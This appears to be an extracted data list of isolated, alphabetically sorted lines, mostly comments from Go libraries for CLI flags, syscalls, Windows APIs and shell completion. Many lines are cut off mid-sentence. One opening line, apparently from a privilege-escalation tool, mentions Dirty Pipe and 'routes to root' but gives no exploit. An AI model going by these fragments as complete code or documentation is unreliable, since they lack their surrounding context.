", or the recent dirty pipe (CVE-2022-0847). More routes to root will be added over time too."
", strings.Join(missingFlagNames, "
", where x=SAVSTACK_ASYNC"
", which prints out all the constants."
",cmd.Root().Name()),"
"- Removing or renaming exported constant, variable, type, or function."
"--flag    // boolean flags, or flags with no option default values"
"-1, 0, 1, -1, 2, -1, -1, -1, 3, -1, -1, -1, -1, -1, -1, -1,"
"-abcs ""hello"""
"-absd=""hello"""
"-release"").Output()"
".  For example, we can test deactivating some Active Help as shown below:"
".$filter"""
".go"")"
".yaml"", """
".yml""}"
"/, 0 /"
"/, 0, 0, 0)"
"/, t.cursorX /"
"//          size_t size,"
"//          u_int32_t position,"
"//       optional, they are enclosed in brackets ([ ])."
"//     followed by double quote ("")"
"//    return []string{""themes""}, ShellCompDirectiveFilterDirs"
"//    return []string{""yaml"", ""json""}, ShellCompDirectiveFilterFileExt"
"//    return nil, ShellCompDirectiveFilterDirs"
"//   - Uint32/SetUint32: ifindex, metric, mtu"
"//   - every double quote ("") is escaped by back slash ("
"//   - finally, s is wrapped with double quotes (arg -> ""arg""),"
"//   --ss=""v1,v2"" --ss=""v3"""
"//   []string{""v1"", ""v2"", ""v3""}"
"//  NewDCESecurity(Group, uint32(os.Getgid()))"
"//  NewDCESecurity(Person, uint32(os.Getuid()))"
"//  NewHash(md5.New(), space, data, 3)"
"//  NewHash(sha1.New(), space, data, 5)"
"//  err := db.QueryRow(""SELECT name FROM foo WHERE id="
"//  hit by a meteorite is estimated to be one chance in 17 billion, that"
"// """
"// ""(unreachable)"" prefix, which can potentially be a valid relative"
"// ""--"" terminates the flags"
"// ""--getUrl"" which may also be translated to ""geturl"" and everything will work."
"// ""> "")."
"// "">= 1.0""."
"// ""Abstract"" Unix domain socket."
"// ""Windows 7, Windows Server 2008 R2, Windows Vista, and Windows"
"// ""continued"" status is 0xFFFF, distinguishing itself"
"// ""key_or_keyring:<key>"", and ""key_or_keyring:<key>:chain""."
"// ""shorthands"" can be a series of shorthand letters of flags (e.g. ""-vvv"")."
"// ""{XXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"" into a GUID."
"// (CAN_TP16, CAN_TP20, CAN_MCNET, and CAN_ISOTP), they can be left with"
"// , or """" if uuid is invalid."
"// - there are no local, non-persistent flags on the command-line or TraverseChildren is true"
"// - when a flag in a group is present, other flags in the group will be marked required"
"// - when a flag in a mutually exclusive group is present, other flags in the group will be marked as hidden"
"// 0x7F (stopped), or a signal number that caused an exit."
"// 1, 2, 3."
"// 1- the feature has been explicitly disabled by the program,"
"// 100-nanosecond intervals since January 1, 1601"
"// 2- Even without completions, we need to print the directive"
"// 2- c has no subcommands (to avoid creating one),"
"// 32-bit dev_t, encoded as mmmM MMmm."
"// <sys/ioctl.h> is broken on powerpc64, as it fails to include definitions of"
"// A flag without a value, or with an "
"// A quick, efficient equality check"
"// AF_INET, an error is returned."
"// AIX wait4 may return with ERESTART errno, while the processus is still"
"// According to documentation, this function always succeeds."
"// According to netdevice(7), only AF_INET addresses are returned for numerous"
"// AddDllDirectory, RemoveDllDirectory, or SetDefaultDllDirectories"
"// Addr represents a bluetooth address, byte ordering is little-endian."
"// After this, the versions are properly sorted"
"// All functions get the same args, the arguments after the command name."
"// Alternatively, these transformations are done:"
"// Always complete ValidArgs, even if we are completing a subcommand name."
"// Always show help if requested, even if SilenceErrors is in"
"// An extra number (exit code, signal causing a stop)"
"// An ifreqData is an Ifreq which carries pointer data. To produce an ifreqData,"
"// As for ptracePeek, we need to align our accesses to deal"
"// As of Linux 4.12, only the ""asymmetric"" keyType defines type-specific"
"// As the last printout, print the completion directive for the completion script to parse."
"// Atim, Mtim and Ctim is changed from StTimespec to Timespec during"
"// AutoCompleteCallback, if non-null, is called for each keypress with"
"// Because EpollWait mutates events, the caller is expected to coordinate"
"// Beginning in Go 1.7, duration zero values are ""0s"""
"// Believe it or not, this is the best we can do on Linux"
"// Bind and Accept must be used. Once the setup process is complete, input"
"// Bool defines a bool flag with specified name, default value, and usage string."
"// BoolP is like Bool, but accepts a shorthand letter that can be used after a single dash."
"// BoolSlice defines a []bool flag with specified name, default value, and usage string."
"// BoolSliceP is like BoolSlice, but accepts a shorthand letter that can be used after a single dash."
"// BoolSliceVar defines a []bool flag with specified name, default value, and usage string."
"// BoolSliceVar defines a boolSlice flag with specified name, default value, and usage string."
"// BoolSliceVarP is like BoolSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// BoolVar defines a bool flag with specified name, default value, and usage string."
"// BoolVarP is like BoolVar, but accepts a shorthand letter that can be used after a single dash."
"// BuildSecurityDescriptor makes a new security descriptor using the input trustees, explicit access lists, and"
"// But the position will actually be correct until we move, so"
"// By default, the zero FlagSet uses an empty name and the"
"// ByteSliceToString returns a string form of the text represented by the slice s, with a terminating NUL and any"
"// BytesBase64 defines an []byte flag with specified name, default value, and usage string."
"// BytesBase64P is like BytesBase64, but accepts a shorthand letter that can be used after a single dash."
"// BytesBase64Var defines an []byte flag with specified name, default value, and usage string."
"// BytesBase64VarP is like BytesBase64Var, but accepts a shorthand letter that can be used after a single dash."
"// BytesHex defines an []byte flag with specified name, default value, and usage string."
"// BytesHexP is like BytesHex, but accepts a shorthand letter that can be used after a single dash."
"// BytesHexVar defines an []byte flag with specified name, default value, and usage string."
"// BytesHexVarP is like BytesHexVar, but accepts a shorthand letter that can be used after a single dash."
"// Call executes procedure p with arguments a. It will panic, if more than 15 arguments"
"// CallClassInstaller member calls the appropriate class installer, and any registered co-installers, with the specified installation request (DIF code)."
"// Channel is a designated bluetooth channel, only 1-30 are available for use."
"// Check if there are any local, non-persistent flags on the command-line"
"// CheckErr prints the msg with the prefix 'Error:' and exits with error code 1. If the msg is nil, it does nothing."
"// ClockSequence returns the current clock sequence, generating one if not"
"// Code generated by linux/mkall.go generatePtracePair(""386"", ""amd64""). DO NOT EDIT."
"// Code generated by linux/mkall.go generatePtracePair(""arm"", ""arm64""). DO NOT EDIT."
"// Code generated by linux/mkall.go generatePtracePair(""mips"", ""mips64""). DO NOT EDIT."
"// Code generated by linux/mkall.go generatePtracePair(""mipsle"", ""mips64le""). DO NOT EDIT."
"// Code generated by linux/mkall.go generatePtraceRegSet(""arm64""). DO NOT EDIT."
"// Command is just that, a command for your application."
"// CommandLine is the default set of command-line flags, parsed from os.Args."
"// Commands similar to git, go tools and other modern CLI tools"
"// Compared to StringArray flags, StringSlice flags take comma-separated value as arguments and split them accordingly."
"// Comparison example. There is also GreaterThan, Equal, and just"
"// Complete subcommand names, including the help command"
"// ComposeCommandLine escapes and joins the given arguments suitable for use as a Windows command line,"
"// Constraint represents a single constraint for a version, such as"
"// Copyright 2009,2010 The Go Authors. All rights reserved."
"// Count defines a count flag with specified name, default value, and usage string."
"// CountVar defines a count flag with specified name, default value, and usage string."
"// Creates a SID for a well-known predefined alias, generally using the constants of the form"
"// Currently, database types that map to string and []byte are supported. Please"
"// DIREG specifies values for SetupDiCreateDevRegKey, SetupDiOpenDevRegKey, and SetupDiDeleteDevRegKey."
"// DLL preloading attacks. To safely load a system DLL, use LazyDLL"
"// DecomposeCommandLine breaks apart its argument command line into unescaped parts using CommandLineToArgv,"
"// Deprecated defines, if this command is deprecated and should print this string when used."
"// Deprecated: Explicitly call OpenProcessToken(CurrentProcess(), ...)"
"// DevInstallParams is device installation parameters structure (associated with a particular device information element, or globally with a device information set)"
"// DeviceInfoListDetail method retrieves information associated with a device information set including the class GUID, remote computer handle, and remote computer name."
"// DisableAutoGenTag defines, if gen tag (""Auto generated by spf13/cobra..."")"
"// Do it the glibc way, add AT_NO_AUTOMOUNT."
"// DrvInfoData is driver information structure (member of a driver info list that may be associated with a particular device instance, or (globally) with a device information set)"
"// Duration defines a time.Duration flag with specified name, default value, and usage string."
"// DurationP is like Duration, but accepts a shorthand letter that can be used after a single dash."
"// DurationSlice defines a []time.Duration flag with specified name, default value, and usage string."
"// DurationSliceP is like DurationSlice, but accepts a shorthand letter that can be used after a single dash."
"// DurationSliceVar defines a durationSlice flag with specified name, default value, and usage string."
"// DurationSliceVar defines a duration[] flag with specified name, default value, and usage string."
"// DurationSliceVarP is like DurationSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// DurationVar defines a time.Duration flag with specified name, default value, and usage string."
"// DurationVarP is like DurationVar, but accepts a shorthand letter that can be used after a single dash."
"// EnableCommandSorting controls sorting of the slice of commands, which is turned on by default."
"// ErrPasteIndicator may be returned from ReadLine as the error, in addition"
"// Even though it is a mistake on the program's side, let's be nice when we can."
"// Even though we could support more than three segments, if we"
"// Every other win32 array API takes arguments as ""pointer, count"", except for this function. So we"
"// Ex: if the golang flag was -v, allow both -v and --v to work"
"// Exec calls execve(2), which replaces the calling executable in the process"
"// ExecuteContext is the same as Execute(), but sets the ctx on the command."
"// ExecuteContextC is the same as ExecuteC(), but sets the ctx on the command."
"// FcntlFlock performs a fcntl syscall for the F_GETLK, F_SETLK or F_SETLKW command."
"// Find(), if those Root commands don't have any sub-commands, they will accept arguments."
"// Flag not supported by this command, the interspersed option might be set so return the original args"
"// Flag requires a value, so it can be suffixed with ="
"// Float32 defines a float32 flag with specified name, default value, and usage string."
"// Float32P is like Float32, but accepts a shorthand letter that can be used after a single dash."
"// Float32Slice defines a []float32 flag with specified name, default value, and usage string."
"// Float32SliceP is like Float32Slice, but accepts a shorthand letter that can be used after a single dash."
"// Float32SliceVar defines a float32Slice flag with specified name, default value, and usage string."
"// Float32SliceVar defines a float32[] flag with specified name, default value, and usage string."
"// Float32SliceVarP is like Float32SliceVar, but accepts a shorthand letter that can be used after a single dash."
"// Float32Var defines a float32 flag with specified name, default value, and usage string."
"// Float32VarP is like Float32Var, but accepts a shorthand letter that can be used after a single dash."
"// Float64 defines a float64 flag with specified name, default value, and usage string."
"// Float64P is like Float64, but accepts a shorthand letter that can be used after a single dash."
"// Float64Slice defines a []float64 flag with specified name, default value, and usage string."
"// Float64SliceP is like Float64Slice, but accepts a shorthand letter that can be used after a single dash."
"// Float64SliceVar defines a float64Slice flag with specified name, default value, and usage string."
"// Float64SliceVar defines a float64[] flag with specified name, default value, and usage string."
"// Float64SliceVarP is like Float64SliceVar, but accepts a shorthand letter that can be used after a single dash."
"// Float64Var defines a float64 flag with specified name, default value, and usage string."
"// Float64VarP is like Float64Var, but accepts a shorthand letter that can be used after a single dash."
"// Flock_t type is SYS_FCNTL64, not SYS_FCNTL."
"// For Go 1.1, we might avoid the allocation of win32finddata1 here"
"// For Root commands that don't specify any value for their Args fields, when we call"
"// For Unix, get the pagesize from the runtime."
"// For example, a sub-command without a description should not be completed"
"// For example, to complete only files of the form "
"// For example, with ""1.2.3"
"// For flags, using Command.MarkFlagFilename() and Command.MarkPersistentFlagFilename()"
"// For flags, using MarkFlagDirname() is a shortcut to using this directive explicitly."
"// For flags, using MarkFlagFilename() and MarkPersistentFlagFilename()"
"// For hashing larger byte slices, or byte streams such as those read from"
"// For more information on TIPC, see: http://tipc.sourceforge.net/."
"// For more information, see: http://www.chronox.de/crypto-API/crypto/userspace-if.html."
"// For portability with other shells, it is recommended to instead use ValidArgsFunction"
"// For z/OS, only replace NUL with @ when the"
"// For z/OS, the length of the name is a field"
"// Fork, exec, wait, etc."
"// Format: a=1,b=2"
"// Get the highest specificity (hS), or if they're equal, just use segmentSelf length"
"// GetLinkedToken returns the linked token, which may be an elevated UAC token."
"// Getcwd returns the number of bytes written to buf, including the NUL."
"// Given ""a "
"// GreaterThan, GreaterThanOrEqual or LessThanOrEqual methods."
"// Gt takes two types and checks whether the first type is greater than the second. In case of types Arrays, Chans,"
"// Guests have a unique CID, and hosts may have a well-known CID of:"
"// Handle first line, which is indented by the caller (or the"
"// Hidden defines, if this command is hidden and should NOT show up in the list of available commands."
"// However, because we have added the __complete sub-command in the current code path, the"
"// However, the value of px_proto_oe is 0, so we can use"
"// IP defines an net.IP flag with specified name, default value, and usage string."
"// IP returns an IPv4 or IPv6 address, or nil if the underlying SocketAddress is neither."
"// IPMask defines an net.IPMask flag with specified name, default value, and usage string."
"// IPMaskP is like IP, but accepts a shorthand letter that can be used after a single dash."
"// IPMaskP is like IPMask, but accepts a shorthand letter that can be used after a single dash."
"// IPMaskVar defines an net.IPMask flag with specified name, default value, and usage string."
"// IPMaskVarP is like IPMaskVar, but accepts a shorthand letter that can be used after a single dash."
"// IPNet defines an net.IPNet flag with specified name, default value, and usage string."
"// IPNetP is like IPNet, but accepts a shorthand letter that can be used after a single dash."
"// IPNetVar defines an net.IPNet flag with specified name, default value, and usage string."
"// IPNetVarP is like IPNetVar, but accepts a shorthand letter that can be used after a single dash."
"// IPP is like IP, but accepts a shorthand letter that can be used after a single dash."
"// IPSlice defines a []net.IP flag with specified name, default value, and usage string."
"// IPSliceP is like IPSlice, but accepts a shorthand letter that can be used after a single dash."
"// IPSliceVar defines a []net.IP flag with specified name, default value, and usage string."
"// IPSliceVar defines a ipSlice flag with specified name, default value, and usage string."
"// IPSliceVarP is like IPSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// IPVar defines an net.IP flag with specified name, default value, and usage string."
"// IPVarP is like IPVar, but accepts a shorthand letter that can be used after a single dash."
"// If DisableFlagParsing==false, we have completed the flags as known by Cobra"
"// If DisableFlagParsing==true, Cobra may not be aware of all flags, so we"
"// If OpenBSD <= 5.9, pledge is not available."
"// If OpenBSD <= 6.2 and execpromises is not empty,"
"// If Set is called on a flag that already has a []bool assigned, the newly converted values will be appended."
"// If Set is called on a flag that already has a []net.IP assigned, the newly converted values will be appended."
"// If a flag doesn't exist, it wasn't changed...."
"// If a flag that is mutually exclusive to others is present, we hide the other"
"// If a flag that is part of a group is present, we make all the other flags"
"// If b is too small to hold a valid stat message, ErrShortStat is returned."
"// If c already has a version flag, it will do nothing."
"// If c already has help command or c has no subcommands, it will do nothing."
"// If c already has help flag, it will do nothing."
"// If c.Version is empty, it will do nothing."
"// If c.parentsPflags == nil, it makes new."
"// If err is EINVAL, this returned ERROR_SUCCESS indicating a non-restricted token."
"// If found parse to a subcommand and then failed, talk about the subcommand"
"// If global normalization function exists, update all children"
"// If help is called, regardless of other flags, return we want help."
"// If multiple direntries are written, sometimes when we reach the final one,"
"// If n is zero then the immediately prior value is returned, if one, then the"
"// If name is """" then the first usable interface found will be used or a random"
"// If name is """" then the name and hardware address of one of the system's"
"// If name is not an absolute path, LoadLibraryEx searches for the DLL"
"// If newErr is nil, os.Stderr is used."
"// If newIn is nil, os.Stdin is used."
"// If newOut is nil, os.Stdout is used."
"// If nil, EINVAL will be returned when the structure is used."
"// If no completions were found within commands or ValidArgs,"
"// If nothing has rejected the version by now, it's valid"
"// If output is nil, os.Stderr is used."
"// If root command has SilenceErrors flagged,"
"// If root command has SilenceUsage flagged,"
"// If the Itimerval argument is the zero value, the timer will be disarmed."
"// If the call fails due to other reasons, current fsgid will be returned."
"// If the call fails due to other reasons, current fsuid will be returned."
"// If the flag contains an = it means it has already been fully processed,"
"// If the flag is not already present, or if it can be specified multiple times (Array or Slice)"
"// If the flag is not already present, we suggest it as a completion"
"// If the flag.Value happens to also be a pflag.Value, just use it directly."
"// If the pointer is nil, it returns the empty string. It assumes that the UTF-16 sequence is terminated"
"// If the pointer is nil, it returns the empty string. It assumes that the text sequence is terminated"
"// If the segments are the same, we must compare on prerelease info"
"// If the stat message itself is invalid, ErrBadStat is returned."
"// If the user wants to port_dissociate before the event has been processed,"
"// If the version being checked has less specificity than the constraint, then there"
"// If the version being checked is naturally less than the constraint, then there"
"// If there are ValidArgs specified (even if they don't match), we stop completion."
"// If there are no back quotes, the name is an educated guess of the"
"// If there is a single completion, the shell usually adds a space"
"// If there is nothing on current line and no prompt printed,"
"// If there isn't enough space in b for a stat message, ErrShortStat is returned."
"// If there were a new target with floating point type for it, we have"
"// If tv is nil, the access and modification times are set to the current time."
"// If we don't have a clock sequence already, set one."
"// If we get here then we have a key that we don't recognise, or a"
"// If we have not found any required flags, only then can we show regular flags"
"// If we're running on OpenBSD > 6.2, pass execpromises to the syscall."
"// If you want boolean results, use the LessThan, Equal,"
"// In NetBSD unlockpt() does nothing, so it isn't called here."
"// In addition to providing an interface, Cobra simultaneously provides a controller to organize your application code."
"// In case of error after this point, make sure we close the ptmx fd."
"// In case of error after this point, make sure we close the pts fd."
"// In epoll, Events is a 32-bit field, while poll uses 16 bits."
"// In most cases, New should be used."
"// In order to only have Timespec structure, type of Stat_t's fields"
"// In order to use msghdr structure with Control, Controllen, nrecvmsg and nsendmsg must be used."
"// In some cases, Linux can return a path that starts with the"
"// In that case, there is no value following it, so we are not really doing flag completion."
"// Indicates that the shell should not add a space after the completion,"
"// Instead, when no other completion is specified, file completion is done by"
"// Int defines an int flag with specified name, default value, and usage string."
"// Int16 defines an int16 flag with specified name, default value, and usage string."
"// Int16P is like Int16, but accepts a shorthand letter that can be used after a single dash."
"// Int16Var defines an int16 flag with specified name, default value, and usage string."
"// Int16VarP is like Int16Var, but accepts a shorthand letter that can be used after a single dash."
"// Int32 defines an int32 flag with specified name, default value, and usage string."
"// Int32P is like Int32, but accepts a shorthand letter that can be used after a single dash."
"// Int32Slice defines a []int32 flag with specified name, default value, and usage string."
"// Int32SliceP is like Int32Slice, but accepts a shorthand letter that can be used after a single dash."
"// Int32SliceVar defines a int32Slice flag with specified name, default value, and usage string."
"// Int32SliceVar defines a int32[] flag with specified name, default value, and usage string."
"// Int32SliceVarP is like Int32SliceVar, but accepts a shorthand letter that can be used after a single dash."
"// Int32Var defines an int32 flag with specified name, default value, and usage string."
"// Int32VarP is like Int32Var, but accepts a shorthand letter that can be used after a single dash."
"// Int64 defines an int64 flag with specified name, default value, and usage string."
"// Int64P is like Int64, but accepts a shorthand letter that can be used after a single dash."
"// Int64Slice defines a []int64 flag with specified name, default value, and usage string."
"// Int64SliceP is like Int64Slice, but accepts a shorthand letter that can be used after a single dash."
"// Int64SliceVar defines a int64Slice flag with specified name, default value, and usage string."
"// Int64SliceVar defines a int64[] flag with specified name, default value, and usage string."
"// Int64SliceVarP is like Int64SliceVar, but accepts a shorthand letter that can be used after a single dash."
"// Int64Var defines an int64 flag with specified name, default value, and usage string."
"// Int64VarP is like Int64Var, but accepts a shorthand letter that can be used after a single dash."
"// Int8 defines an int8 flag with specified name, default value, and usage string."
"// Int8P is like Int8, but accepts a shorthand letter that can be used after a single dash."
"// Int8Var defines an int8 flag with specified name, default value, and usage string."
"// Int8VarP is like Int8Var, but accepts a shorthand letter that can be used after a single dash."
"// IntP is like Int, but accepts a shorthand letter that can be used after a single dash."
"// IntSlice defines a []int flag with specified name, default value, and usage string."
"// IntSliceP is like IntSlice, but accepts a shorthand letter that can be used after a single dash."
"// IntSliceVar defines a intSlice flag with specified name, default value, and usage string."
"// IntSliceVar defines a int[] flag with specified name, default value, and usage string."
"// IntSliceVarP is like IntSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// IntVar defines an int flag with specified name, default value, and usage string."
"// IntVarP is like IntVar, but accepts a shorthand letter that can be used after a single dash."
"// It is used for ProcessVMReadv and ProcessVMWritev, where the pointer"
"// It panics, if len(name) > 1."
"// It visits all flags, even those not set."
"// It will always return ""0"" if the global environment variable COBRA_ACTIVE_HELP"
"// It's always a valid pointer, although the escape codes themselves"
"// It's not documented if this is necessary, but we're paranoid."
"// It's not the full required semantics, but should handle the case"
"// Just Dup'ing the file descriptor is not enough, as the"
"// KEYCTL_ASSUME_AUTHORITY, KEYCTL_SESSION_TO_PARENT, KEYCTL_REJECT,"
"// KEYCTL_INVALIDATE, and KEYCTL_GET_PERSISTENT."
"// KEYCTL_UNLINK, KEYCTL_NEGATE, KEYCTL_SET_REQKEY_KEYRING, KEYCTL_SET_TIMEOUT,"
"// KnownFolderPath returns a well-known folder path for the current user, specified by one of"
"// KnownFolderPath returns a well-known folder path for the user token, specified by one of"
"// Len returns the length, in bytes, of a valid security identifier SID."
"// Let the logic continue so as to add any ValidArgsFunction completions,"
"// Licensed under the Apache License, Version 2.0 (the ""License"")"
"// Linux on s390x uses the old mmap interface, which requires arguments to be passed in a struct."
"// Linux watchdog API. For more information, see:"
"// Load will not try to load DLL, if it is already loaded into memory."
"// Look for a back-quoted name, but avoid the strings package."
"// Lookup returns the Flag structure of the named command-line flag,"
"// Lookup returns the Flag structure of the named flag, returning nil if none exists."
"// Magic sysctl: ""setting"" 0.3 to a string name"
"// Maps and Slices, Gt will compare their lengths. Ints are compared directly while strings are first parsed as"
"// MarkFlagCustom adds the BashCompCustom annotation to the named flag, if it exists."
"// Metadata is anything that comes after the """
"// Missing operator is treated as equal to '=', whitespaces"
"// Mmap manager, for use by operating system-specific implementations."
"// NOTE: It seems like 64-bit Darwin, Illumos and Solaris"
"// NTStatus corresponds with NTSTATUS, error values returned by ntdll.dll and"
"// NTString is an ANSI string for NT native APIs, corresponding to STRING."
"// NTUnicodeString is a UTF-16 string for NT native APIs, corresponding to UNICODE_STRING."
"// NULL-style string interfaces, so this simple wrapper is provided."
"// NewFlagSet returns a new, empty flag set with the specified name,"
"// NewLazySystemDLL is like NewLazyDLL, but will only"
"// NewProcThreadAttributeList allocates a new ProcThreadAttributeListContainer, with the requested maximum number of attributes."
"// NodeID returns a slice of a copy of the current Node ID, setting the Node ID"
"// Not friendly to overwrite in place,"
"// Now that we know the size, get the actual nodes."
"// Null assigns special ""don't touch"" values to members of d to"
"// OK, except with the pessimistic operator"
"// On 32-bit Linux systems, the fcntl syscall that matches Go's"
"// On Linux, this is an in-kernel data structure accessed through a fd."
"// On linux Setuid and Setgid only affects the current thread, not the process."
"// On non-Windows platforms, it always returns false."
"// On ppc64, Timespec.Nsec is an int64 while StTimespec.Nsec is an"
"// On s390x Linux, all the socket calls go through an extra indirection."
"// On sparc{,64}, the kernel defines struct termios2 itself which clashes with the"
"// On x86 Linux, all the socket calls go through an extra indirection,"
"// Once a file descriptor has been returned from Accept, it may be used to"
"// One of the flags of the group is set, mark the other ones as required"
"// One of the flags of the mutually exclusive group is set, mark the other ones as hidden"
"// Original returns the original parsed version as-is, including any"
"// Otherwis, rhs was > lhs, they're not equal"
"// Otherwise tv must contain exactly 2 elements, with access time as the first"
"// Package term provides support functions for dealing with terminals, as"
"// Package terminal provides support functions for dealing with terminals, as"
"// Parse parses flag definitions from the argument list, which should not"
"// ParseAll parses flag definitions from the argument list, which should not"
"// ParseBytes is like Parse, except it parses a byte slice instead of a string."
"// ParseDirent parses up to max directory entries in buf,"
"// Prerelease information is anything that comes after the ""-"" in the"
"// Prerelease returns any prerelease data that is part of the version,"
"// Print is a convenience method to Print to the defined output, fallback to Stderr if not set."
"// PrintDefaults prints, to standard error unless configured"
"// PrintErr is a convenience method to Print to the defined Err output, fallback to Stderr if not set."
"// PrintErrf is a convenience method to Printf to the defined Err output, fallback to Stderr if not set."
"// PrintErrln is a convenience method to Println to the defined Err output, fallback to Stderr if not set."
"// Printf is a convenience method to Printf to the defined output, fallback to Stderr if not set."
"// Printf works like fmt.Printf, but adds the option of using tags to apply colour or text formatting to the written text. For example ""<red>some red text</red>""."
"// Println is a convenience method to Println to the defined output, fallback to Stderr if not set."
"// Println works like fmt.Println, but adds the option of using tags to apply colour or text formatting to the written text. For example ""<red>some red text</red>""."
"// ProcThreadAttributeListContainer.Delete, and access the list itself using"
"// REG_NOTIFY_CHANGE_ATTRIBUTES notifies the caller of changes to the attributes of the key, such as the security descriptor information."
"// REG_NOTIFY_CHANGE_LAST_SET notifies the caller of changes to a value of the key. This can include adding or deleting a value, or changing an existing value."
"// ReadPassword temporarily changes the prompt and reads a password, without"
"// Regardless of what command execute is called on, run on Root only"
"// ResetCommands delete parent, subcommand and help command from c."
"// ResourceID represents a 16-bit resource identifier, traditionally created with the MAKEINTRESOURCE macro."
"// ResourceIDOrString must be either a ResourceID, to specify a resource or resource type by ID,"
"// Returns a default environment associated with the token, rather than the current"
"// RtlGetNtVersionNumbers returns the version of the underlying operating system,"
"// RtlGetVersion returns the version of the underlying operating system, ignoring"
"// SID into a valid, functional SID."
"// SP_MAX_MACHINENAME_LENGTH defines maximum length of a machine name in the format expected by ConfigMgr32 CM_Connect_Machine (i.e., """
"// SYS_ALARM is not defined on arm or riscv, but is available for other GOARCH"
"// SYS___SYSCTL is used by syscall_bsd.go for all BSDs, but in modern versions"
"// Search config in home directory with name "".cobra"" (without extension)."
"// Set converts, and assigns, the comma-separated IP argument string representation as the []net.IP value of this flag."
"// Set converts, and assigns, the comma-separated boolean argument string representation as the []bool value of this flag."
"// SetArgs sets arguments for the command. It is set to os.Args[1:] by default, if desired, can be overridden"
"// SetNodeInterface never fails when name is """"."
"// SetRand sets the random number generator to r, which implements io.Reader."
"// SetSelectedDriver method sets, or resets, the selected driver for a device information element or the selected class driver for a device information set."
"// SetupDiCallClassInstaller function calls the appropriate class installer, and any registered co-installers, with the specified installation request (DIF code)."
"// SetupDiGetDeviceInfoListDetail function retrieves information associated with a device information set including the class GUID, remote computer handle, and remote computer name."
"// ShorthandLookup returns the Flag structure of the short handed flag,"
"// SignalNum returns the syscall.Signal for signal named s,"
"// Since boolean flags and shortname flags don't show the = form, let's go that route and never show it."
"// Since the pool is stored on the Go heap, this feature may be a bad fit"
"// So, if we are stopping at the end of a line, we"
"// Some BSDs include the trailing NUL in the length, whereas"
"// Sort values, so they can be tested/scripted against consistently."
"// SortFlags is used to indicate, if user wants to have sorted flags in"
"// Sprintf works like fmt.Sprintf, but adds the option of using tags to apply colour or text formatting to the written text. For example ""<red>some red text</red>""."
"// Start assigns a pseudo-terminal tty os.File to c.Stdin, c.Stdout,"
"// StartWithAttrs assigns a pseudo-terminal tty os.File to c.Stdin, c.Stdout,"
"// StartWithSize assigns a pseudo-terminal tty os.File to c.Stdin, c.Stdout,"
"// String converts SID to a string format suitable for display, storage, or transmission."
"// String defines a ""native"" format for this boolean slice flag value."
"// String defines a ""native"" format for this net.IP slice flag value."
"// String defines a string flag with specified name, default value, and usage string."
"// String returns the SDDL form of the security descriptor, with a function signature that can be"
"// String returns the canonical string form of the GUID,"
"// String returns the string form of uuid, xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
"// StringArray defines a string flag with specified name, default value, and usage string."
"// StringArrayP is like StringArray, but accepts a shorthand letter that can be used after a single dash."
"// StringArrayVar defines a string flag with specified name, default value, and usage string."
"// StringArrayVarP is like StringArrayVar, but accepts a shorthand letter that can be used after a single dash."
"// StringP is like String, but accepts a shorthand letter that can be used after a single dash."
"// StringSlice defines a string flag with specified name, default value, and usage string."
"// StringSliceP is like StringSlice, but accepts a shorthand letter that can be used after a single dash."
"// StringSliceVar defines a string flag with specified name, default value, and usage string."
"// StringSliceVarP is like StringSliceVar, but accepts a shorthand letter that can be used after a single dash."
"// StringToInt defines a string flag with specified name, default value, and usage string."
"// StringToInt64 defines a string flag with specified name, default value, and usage string."
"// StringToInt64P is like StringToInt64, but accepts a shorthand letter that can be used after a single dash."
"// StringToInt64Var defines a string flag with specified name, default value, and usage string."
"// StringToInt64VarP is like StringToInt64Var, but accepts a shorthand letter that can be used after a single dash."
"// StringToIntP is like StringToInt, but accepts a shorthand letter that can be used after a single dash."
"// StringToIntVar defines a string flag with specified name, default value, and usage string."
"// StringToIntVarP is like StringToIntVar, but accepts a shorthand letter that can be used after a single dash."
"// StringToString defines a string flag with specified name, default value, and usage string."
"// StringToStringP is like StringToString, but accepts a shorthand letter that can be used after a single dash."
"// StringToStringVar defines a string flag with specified name, default value, and usage string."
"// StringToStringVarP is like StringToStringVar, but accepts a shorthand letter that can be used after a single dash."
"// StringVar defines a string flag with specified name, default value, and usage string."
"// StringVarP is like StringVar, but accepts a shorthand letter that can be used after a single dash."
"// System call support for 386, Plan 9"
"// System call support for amd64, Plan 9"
"// System call support for mips64, OpenBSD"
"// System calls for 386, Linux"
"// System calls for AMD64, Linux"
"// System calls for amd64, Solaris are implemented in runtime/syscall_solaris.go"
"// System calls for arm, Linux"
"// System calls for mips, Linux"
"// System calls for mips64, Linux"
"// System calls for ppc64, AIX are implemented in runtime/syscall_aix.go"
"// System calls for ppc64, Linux"
"// System calls for s390x, Linux"
"// TODO(jsing): DragonFly has a ""bug"" (see issue 3349), which should be"
"// TODO(mdlayher): get/set methods for hardware address sockaddr, char array, etc."
"// TODO(neeilan): Commented this out to get sys/unix compiling on z/OS. Uncomment and fix. Error: ""undefined: clearsyscall"""
"// TODO(neeilan): When we make epfds and fds disjoint, detect epoll"
"// TODO: add more here, after collecting data on the common"
"// TODO: if we get the chance, remove the req parameter and"
"// TODO: if we get the chance, remove the req parameter."
"// TODO: this isn't quite right, we should really check ahead for 'true' or 'false'"
"// The ""asymmetric"" keyType defines restrictions requiring key payloads to be"
"// The = form will still work, we just won't suggest it."
"// The domain should be one of Person, Group or Org."
"// The following constants are part of the epoll API, but represent"
"// The kernel already special-cases its name, so it's always"
"// The last argument, which is not completely typed by the user,"
"// The peek requests are machine-size oriented, so we wrap it"
"// The req value is expected to be TCSETS, TCSETSW, or TCSETSF"
"// The returned error is always non-nil, constructed from the result of GetLastError."
"// The signal name should start with ""SIG""."
"// The src is 1 element bigger than dst, but it must be NUL."
"// The system creates an access token when a user logs on, and every"
"// The token identifies the user, the user's groups, and the user's"
"// The usual level and opt are SOL_LOCAL and LOCAL_PEERCRED, respectively."
"// The version might have newlines or tabs in it, convert them to"
"// There are various irregularities.  For example, the"
"// There are various irregularities. For example, the"
"// There is no loss of expressivity here, because the final"
"// There is no way to create a custom fcntl and to keep //sys fcntl easily,"
"// Therefore, the programmer must call dup2 instead of fcntl in this case."
"// These are EBCDIC encoded by the kernel, but we still need to pad them"
"// These are not suggested to the user in the shell completion,"
"// These commands are KEYCTL_REVOKE, KEYCTL_CHOWN, KEYCTL_CLEAR, KEYCTL_LINK,"
